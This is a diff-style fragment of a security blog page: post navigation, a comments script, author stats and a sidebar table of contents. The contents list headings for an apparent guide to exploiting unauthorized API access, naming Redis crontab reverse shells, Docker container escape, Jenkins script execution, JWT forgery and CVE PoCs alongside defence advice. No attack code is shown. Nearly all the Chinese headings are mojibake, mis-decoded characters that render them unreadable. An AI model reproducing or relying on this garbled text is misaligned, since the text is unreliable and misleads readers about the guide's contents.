+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/07/09/Coremail_XT5/" rel="prev" title="Coremail XT5 2FA绕过分析">
+      <i class="fa fa-chevron-left"></i> Coremail XT5 2FA绕过分析
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2026/07/09/CVE-2025-55182/" rel="next" title="CVE-2025-55182 React2Shell漏洞分析">
+      CVE-2025-55182 React2Shell漏洞分析 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#API-%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89%E5%86%AD%EE%86%96%E9%97%82%EE%86%BD%E7%B4%A1%E5%A8%B2%E7%82%B2%E5%9E%8E%E9%8F%8B%E6%84%AA%E7%AC%8C%E9%8D%92%E2%95%83%E6%95%A4%E9%8E%B8%E5%9B%A7%E5%B4%A1"><span class="nav-number">1.</span> <span class="nav-text">API 鏈巿鏉冭闂紡娲炲垎鏋愪笌鍒╃敤鎸囧崡</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%90%A9%EE%86%BC%E7%B6%8D"><span class="nav-number">1.1.</span> <span class="nav-text">鐩綍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B6%93%E2%82%AC%E9%8A%86%E4%BD%B9%EE%9B%A7%E6%9D%A9"><span class="nav-number">1.2.</span> <span class="nav-text">涓€銆佹杩?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E6%B5%A0%E2%82%AC%E6%B6%94%E5%A0%9F%E6%A7%B8-API-%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89%E5%86%AD%EE%86%96%E9%97%82"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.1 浠€涔堟槸 API 鏈巿鏉冭闂?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E5%A9%95%E5%BF%94%E7%A4%8A%E9%8E%B4%E6%84%AC%E6%B4%9C"><span class="nav-number">1.2.2.</span> <span class="nav-text">1.2 婕忔礊鎴愬洜</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-%E5%A9%95%E5%BF%94%E7%A4%8A%E9%8D%97%E5%8D%9E%EE%86%8A"><span class="nav-number">1.2.3.</span> <span class="nav-text">1.3 婕忔礊鍗卞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%80%B9%E7%82%B0%E7%B7%A5%E6%BF%A1%E5%82%A6%E7%B4%B0ThinkPHP-5-x-%E5%AF%AE%E5%93%84%E5%9F%97%E7%92%BA%EE%88%9C%E6%95%B1-Swagger-%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">瀹炰緥濡傦細ThinkPHP 5.x 寮哄埗璺敱 + Swagger 鏈巿鏉?</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-Spring-Boot-Actuator-%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89"><span class="nav-number">1.2.4.</span> <span class="nav-text">3.2 Spring Boot Actuator 鏈巿鏉?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4%E5%AC%AD%E7%9F%BE%E5%AF%B0"><span class="nav-number">1.2.4.1.</span> <span class="nav-text">妫€娴嬭矾寰?</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%8D%97%E5%8D%9E%EE%86%8A%E7%BB%9B%E5%A4%8C%E9%AA%87%E9%94%9B%E5%A0%A2%E6%95%B1%E6%A5%82%E6%A8%BA%E5%9F%8C%E6%B5%A3%E5%BA%AF%E7%B4%9A"><span class="nav-number">1.2.4.2.</span> <span class="nav-text">鍗卞绛夌骇锛堢敱楂樺埌浣庯級</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4-PoC%E9%94%9B%E6%AC%BBeapdump-%E5%A8%89%E5%8B%AF%E6%B9%B6"><span class="nav-number">1.2.4.3.</span> <span class="nav-text">妫€娴?PoC锛欻eapdump 娉勯湶</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4-PoC%E9%94%9B%E6%AC%B5nv-%E7%BB%94%EE%88%9C%E5%81%A3%E5%A8%89%E5%8B%AF%E6%B9%B6"><span class="nav-number">1.2.4.4.</span> <span class="nav-text">妫€娴?PoC锛欵nv 绔偣娉勯湶</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-Druid-%E9%90%A9%E6%88%9E%E5%B8%B6%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89"><span class="nav-number">1.2.5.</span> <span class="nav-text">3.3 Druid 鐩戞帶鏈巿鏉?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4%E5%AC%AD%E7%9F%BE%E5%AF%B0-1"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">妫€娴嬭矾寰?</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%8D%92%E2%95%83%E6%95%A4-Session-%E7%BB%90%E5%86%A8%E5%BD%87"><span class="nav-number">1.2.5.2.</span> <span class="nav-text">鍒╃敤 Session 绐冨彇</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%8D%92%E2%95%83%E6%95%A4"><span class="nav-number">1.2.5.3.</span> <span class="nav-text">鍒╃敤</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-5-ASP-NET-Swagger-SignalR-%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89"><span class="nav-number">1.2.6.</span> <span class="nav-text">3.5 ASP.NET Swagger &#x2F; SignalR 鏈巿鏉?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ASP-NET-Swagger-%E5%A6%AB%E2%82%AC%E5%A8%B4"><span class="nav-number">1.2.6.1.</span> <span class="nav-text">ASP.NET Swagger 妫€娴?</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SignalR-Hub-%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89"><span class="nav-number">1.2.6.2.</span> <span class="nav-text">SignalR Hub 鏈巿鏉?</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%8D%A5%E6%B6%96%E2%82%AC%E4%BD%B7%E8%85%91%E9%97%82%E7%BF%A0%E6%AC%A2-%E9%8F%88%E5%B6%85%E5%A7%9F-API-%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89"><span class="nav-number">1.3.</span> <span class="nav-text">鍥涖€佷腑闂翠欢 &#x2F; 鏈嶅姟 API 鏈巿鏉?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-Redis-%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89%E5%86%AD%EE%86%96%E9%97%82"><span class="nav-number">1.3.1.</span> <span class="nav-text">4.1 Redis 鏈巿鏉冭闂?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%8D%97%E5%8D%9E%EE%86%8A"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">鍗卞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4-PoC"><span class="nav-number">1.3.1.2.</span> <span class="nav-text">妫€娴?PoC</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%8D%92%E2%95%83%E6%95%A4%E9%94%9B%E6%B0%AC%E5%95%93%E9%8D%8F-crontab-%E9%8D%99%E5%B6%85%E8%84%8A-Shell%E9%94%9B%E5%9C%A0inux%E9%94%9B"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">鍒╃敤锛氬啓鍏?crontab 鍙嶅脊 Shell锛圠inux锛?</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-MongoDB-%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89%E5%86%AD%EE%86%96%E9%97%82"><span class="nav-number">1.3.2.</span> <span class="nav-text">4.2 MongoDB 鏈巿鏉冭闂?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4-PoC-1"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">妫€娴?PoC</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-Elasticsearch-%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89%E5%86%AD%EE%86%96%E9%97%82"><span class="nav-number">1.3.3.</span> <span class="nav-text">4.3 Elasticsearch 鏈巿鏉冭闂?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4%E5%AC%AD%E7%9F%BE%E5%AF%B0-2"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">妫€娴嬭矾寰?</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4-PoC-2"><span class="nav-number">1.3.3.2.</span> <span class="nav-text">妫€娴?PoC</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-4-Docker-Remote-API-%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89"><span class="nav-number">1.3.4.</span> <span class="nav-text">4.4 Docker Remote API 鏈巿鏉?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4-PoC-3"><span class="nav-number">1.3.4.1.</span> <span class="nav-text">妫€娴?PoC</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%8D%92%E2%95%83%E6%95%A4%E9%94%9B%E6%B0%AC%E6%83%8E%E9%8D%94%E3%84%A7%E5%A3%92%E9%8F%89%E5%86%A8%EE%86%90%E9%8D%A3-%E9%88%AB-%E7%80%B9%E5%A4%B8%E5%AF%8C%E9%8F%88%E7%83%98%E6%8B%A8%E9%97%84"><span class="nav-number">1.3.4.2.</span> <span class="nav-text">鍒╃敤锛氬惎鍔ㄧ壒鏉冨鍣?鈫?瀹夸富鏈烘拨闄?</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-5-Jenkins-%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89%E5%86%AD%EE%86%96%E9%97%82"><span class="nav-number">1.3.5.</span> <span class="nav-text">4.5 Jenkins 鏈巿鏉冭闂?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4%E5%AC%AD%E7%9F%BE%E5%AF%B0-3"><span class="nav-number">1.3.5.1.</span> <span class="nav-text">妫€娴嬭矾寰?</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%8D%92%E2%95%83%E6%95%A4%E9%94%9B%E6%B0%B3%E5%89%BC%E9%8F%88%EE%84%80%E6%87%A1%E6%B5%A0%E3%82%88%EE%94%91%E9%8E%B5%D1%86%EE%94%91"><span class="nav-number">1.3.5.2.</span> <span class="nav-text">鍒╃敤锛氳剼鏈懡浠よ鎵ц</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%8D%92%E2%95%83%E6%95%A4%E9%94%9B%E6%B0%B6%E2%82%AC%E6%B0%B3%E7%B9%83%E9%8F%8B%E5%8B%AB%E7%BC%93%E6%B5%A0%E8%AF%B2%E5%A7%9F%E9%8E%B5%D1%86%EE%94%91%E9%8D%9B%E6%88%92%E6%8A%A4"><span class="nav-number">1.3.5.3.</span> <span class="nav-text">鍒╃敤锛氶€氳繃鏋勫缓浠诲姟鎵ц鍛戒护</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-6-Hadoop-YARN-ResourceManager-%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89"><span class="nav-number">1.3.6.</span> <span class="nav-text">4.6 Hadoop YARN ResourceManager 鏈巿鏉?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4%E5%AC%AD%E7%9F%BE%E5%AF%B0-4"><span class="nav-number">1.3.6.1.</span> <span class="nav-text">妫€娴嬭矾寰?</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4-PoC-4"><span class="nav-number">1.3.6.2.</span> <span class="nav-text">妫€娴?PoC</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-7-Zookeeper-%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89%E5%86%AD%EE%86%96%E9%97%82"><span class="nav-number">1.3.7.</span> <span class="nav-text">4.7 Zookeeper 鏈巿鏉冭闂?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4-PoC-5"><span class="nav-number">1.3.7.1.</span> <span class="nav-text">妫€娴?PoC</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%AF%E5%93%A5%E6%95%A4%E9%8D%A5%E6%B6%98%E7%93%A7%E9%8D%9B%E6%88%92%E6%8A%A4"><span class="nav-number">1.3.7.2.</span> <span class="nav-text">甯哥敤鍥涘瓧鍛戒护</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-8-Memcached-%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89%E5%86%AD%EE%86%96%E9%97%82"><span class="nav-number">1.3.8.</span> <span class="nav-text">4.8 Memcached 鏈巿鏉冭闂?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4-PoC-6"><span class="nav-number">1.3.8.1.</span> <span class="nav-text">妫€娴?PoC</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%9C%E6%96%BB%E2%82%AC%E4%B8%86MS-%E6%90%B4%E6%97%82%E6%95%A4-API-%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89%E5%86%BF%E7%B4%99%E9%8D%9A-CVE-PoC%E9%94%9B"><span class="nav-number">1.4.</span> <span class="nav-text">浜斻€丆MS &#x2F; 搴旂敤 API 鏈巿鏉冿紙鍚?CVE &amp; PoC锛?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-Joomla-REST-API-%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89%E5%86%BF%E7%B4%99CVE-2023-23752%E9%94%9B"><span class="nav-number">1.4.1.</span> <span class="nav-text">5.1 Joomla REST API 鏈巿鏉冿紙CVE-2023-23752锛?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4-PoC-7"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">妫€娴?PoC</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A3%B0%E5%8B%AC%E6%B9%A1%E9%8D%9D%E5%B6%85%E7%B0%B2"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">棰勬湡鍝嶅簲</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#FOFA-%E9%8E%B8%E5%9B%A9%E6%B1%97"><span class="nav-number">1.4.1.3.</span> <span class="nav-text">FOFA 鎸囩汗</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-WordPress-REST-API-%E9%90%A2%E3%84%A6%E5%9F%9B%E6%B7%87%E2%84%83%E4%BC%85%E5%A8%89%E5%8B%AF%E6%B9%B6"><span class="nav-number">1.4.2.</span> <span class="nav-text">5.2 WordPress REST API 鐢ㄦ埛淇℃伅娉勯湶</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4-PoC-8"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">妫€娴?PoC</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%8D%92%E2%95%83%E6%95%A4-1"><span class="nav-number">1.4.2.2.</span> <span class="nav-text">鍒╃敤</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%91%BE%E5%B3%B0%E5%BD%87%E9%90%A2%E3%84%A6%E5%9F%9B%E6%B7%87%E2%84%83%E4%BC%85%E9%8D%9A%E5%BA%AF%E7%B4%9D%E7%BC%81%E6%92%B3%E6%82%8E%E5%AF%AE%E5%8D%9E%E5%BD%9B%E6%B5%A0%E3%82%87%E5%9E%8E%E9%90%AE%E6%9D%91%E6%82%97%E9%8D%99%E6%89%AE%E6%AB%A5%E8%A4%B0%E6%9B%98%E2%82%AC"><span class="nav-number">1.5.</span> <span class="nav-text">鑾峰彇鐢ㄦ埛淇℃伅鍚庯紝缁撳悎寮卞彛浠ょ垎鐮村悗鍙扮櫥褰曘€?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-ThinkPHP-API-%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89"><span class="nav-number">1.5.1.</span> <span class="nav-text">5.3 ThinkPHP API 鏈巿鏉?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4-PoC-9"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">妫€娴?PoC</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-4-%E9%96%AB%E6%B0%B3%E6%8F%AAOA-API-%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89"><span class="nav-number">1.5.2.</span> <span class="nav-text">5.4 閫氳揪OA API 鏈巿鏉?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4%E5%AC%AD%E7%9F%BE%E5%AF%B0-5"><span class="nav-number">1.5.2.1.</span> <span class="nav-text">妫€娴嬭矾寰?</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-5-%E9%91%B7%E7%A3%8B%E7%B9%99OA-API-%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89"><span class="nav-number">1.5.3.</span> <span class="nav-text">5.5 鑷磋繙OA API 鏈巿鏉?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4%E5%AC%AD%E7%9F%BE%E5%AF%B0-6"><span class="nav-number">1.5.3.1.</span> <span class="nav-text">妫€娴嬭矾寰?</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4-PoC-10"><span class="nav-number">1.5.3.2.</span> <span class="nav-text">妫€娴?PoC</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-6-%E9%90%A2%E3%84%A5%E5%BC%B8NC-API-%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89"><span class="nav-number">1.5.4.</span> <span class="nav-text">5.6 鐢ㄥ弸NC API 鏈巿鏉?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4%E5%AC%AD%E7%9F%BE%E5%AF%B0-7"><span class="nav-number">1.5.4.1.</span> <span class="nav-text">妫€娴嬭矾寰?</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4-PoC-11"><span class="nav-number">1.5.4.2.</span> <span class="nav-text">妫€娴?PoC</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%8D%8F%EE%85%9C%E2%82%AC%E4%BD%B7%E7%AC%9F%E9%8D%94%EF%BF%A0%E2%82%AC%E6%98%8F%E7%B7%AB%E7%81%9E-API-%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89"><span class="nav-number">1.6.</span> <span class="nav-text">鍏€佷笟鍔￠€昏緫灞?API 鏈巿鏉?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-%E5%A7%98%E6%9D%91%E9%92%A9%E7%93%92%E5%A9%83%E6%BD%88%E9%94%9B%E5%9C%9BDOR%E9%94%9B"><span class="nav-number">1.6.1.</span> <span class="nav-text">6.1 姘村钩瓒婃潈锛圛DOR锛?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4%E5%AC%AA%E6%BA%80%E9%8F%85"><span class="nav-number">1.6.1.1.</span> <span class="nav-text">妫€娴嬪満鏅?</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%AF%E6%AD%8C%EE%9D%86-IDOR-%E9%8D%99%E5%82%9B%E6%9A%9F"><span class="nav-number">1.6.1.2.</span> <span class="nav-text">甯歌 IDOR 鍙傛暟</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-%E9%8D%A8%E5%82%9C%E6%B4%BF%E7%93%92%E5%A9%83%E6%BD%88"><span class="nav-number">1.6.2.</span> <span class="nav-text">6.2 鍨傜洿瓒婃潈</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4%E5%AC%AA%E6%BA%80%E9%8F%85-1"><span class="nav-number">1.6.2.1.</span> <span class="nav-text">妫€娴嬪満鏅?</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-3-%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89%E5%86%A9%E6%99%B1%E9%8E%B0%E7%86%B8%E5%B8%B4%E9%8D%99"><span class="nav-number">1.6.3.</span> <span class="nav-text">6.3 鏈巿鏉冩晱鎰熸帴鍙?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%AF%E6%AD%8C%EE%9D%86%E9%8F%81%E5%BF%94%E5%8A%85%E9%8E%BA%E3%83%A5%E5%BD%9B%E9%94%9B%E5%A0%9F%E6%A3%A4%E9%97%87%E2%82%AC%E6%B5%A0%E8%AE%B3%E7%B6%8D-Token-%E9%8D%97%E5%86%B2%E5%BD%B2%E7%92%81%E5%9D%97%E6%A3%B6%E9%94%9B"><span class="nav-number">1.6.3.1.</span> <span class="nav-text">甯歌鏁忔劅鎺ュ彛锛堟棤闇€浠讳綍 Token 鍗冲彲璁块棶锛?</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-5-JWT-%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89-%E6%B5%BC%EE%81%88%E2%82%AC"><span class="nav-number">1.6.4.</span> <span class="nav-text">6.5 JWT 鏈巿鏉?&#x2F; 浼€?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%AF%E6%AD%8C%EE%9D%86-JWT-%E9%97%82%EE%87%80%EE%95%BD"><span class="nav-number">1.6.4.1.</span> <span class="nav-text">甯歌 JWT 闂</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4-PoC-12"><span class="nav-number">1.6.4.2.</span> <span class="nav-text">妫€娴?PoC</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B6%93%E5%86%A6%E2%82%AC%E4%BD%B8%E7%96%84%E9%8E%B4%E6%A8%BB%EE%97%85%E5%A8%B4%E5%AC%AB%E6%9F%9F%E5%A8%89%E6%9B%A1%EE%86%91"><span class="nav-number">1.7.</span> <span class="nav-text">涓冦€佸疄鎴樻娴嬫柟娉曡</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#7-1-%E6%B7%87%E2%84%83%E4%BC%85%E9%8F%80%E5%A0%95%E6%B3%A6%E9%97%83%E8%88%B5%EE%86%8C"><span class="nav-number">1.7.1.</span> <span class="nav-text">7.1 淇℃伅鏀堕泦闃舵</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-2-%E9%8F%88%EE%81%85%E5%B7%BF%E9%8F%89%E5%86%A9%EE%97%85%E5%A8%B4%E5%AC%AE%E6%A8%81%E5%A8%88"><span class="nav-number">1.7.2.</span> <span class="nav-text">7.2 鏈巿鏉冩娴嬮樁娈?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-3-%E9%8D%92%E2%95%83%E6%95%A4%E9%97%83%E8%88%B5%EE%86%8C"><span class="nav-number">1.7.3.</span> <span class="nav-text">7.3 鍒╃敤闃舵</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-2-%E9%96%AB%E6%B0%B1%E6%95%A4-API-%E7%92%BA%EE%88%9A%E7%B7%9E%E9%90%96%E5%97%99%E7%89%AC%E7%80%9B%E6%A5%80%E5%90%80"><span class="nav-number">1.7.4.</span> <span class="nav-text">8.2 閫氱敤 API 璺緞鐖嗙牬瀛楀吀</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B6%94%E6%BF%84%E2%82%AC%E4%BE%80%E6%A7%BB%E5%AF%B0%E2%80%B3%E7%BC%93%E7%92%81"><span class="nav-number">1.8.</span> <span class="nav-text">涔濄€侀槻寰″缓璁?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#9-1-%E5%AF%AE%E2%82%AC%E9%8D%99%E6%88%A6%E6%A8%81%E5%A8%88"><span class="nav-number">1.8.1.</span> <span class="nav-text">9.1 寮€鍙戦樁娈?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-2-%E5%A8%B4%E5%AC%AD%E7%98%AF%E9%97%83%E8%88%B5%EE%86%8C"><span class="nav-number">1.8.2.</span> <span class="nav-text">9.2 娴嬭瘯闃舵</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-3-%E6%9D%A9%E6%84%AE%E6%B7%AE%E9%97%83%E8%88%B5%EE%86%8C"><span class="nav-number">1.8.3.</span> <span class="nav-text">9.3 杩愮淮闃舵</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-4-%E6%B6%93%EE%85%A2%E6%A3%BF%E6%B5%A0%E8%B7%BA%E7%95%A8%E9%8D%8F%E3%84%A9%E5%8E%A4%E7%BC%83"><span class="nav-number">1.8.4.</span> <span class="nav-text">9.4 涓棿浠跺畨鍏ㄩ厤缃?</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%8D%97%E4%BD%B5%E2%82%AC%E4%BE%80%E6%AA%AE%E8%A4%B0%E6%9B%AA%E7%B4%B0CVE-%E9%96%AB%E7%86%B8%E7%85%A1%E7%90%9B"><span class="nav-number">1.9.</span> <span class="nav-text">鍗併€侀檮褰曪細CVE 閫熸煡琛?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%84%E5%8B%B6%E7%B4%B0%E9%8D%99%E5%82%9D%E2%82%AC%E5%86%AE%E6%91%BC%E9%8E%BA"><span class="nav-number">1.10.</span> <span class="nav-text">闄勶細鍙傝€冮摼鎺?</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Xioku"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Xioku</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
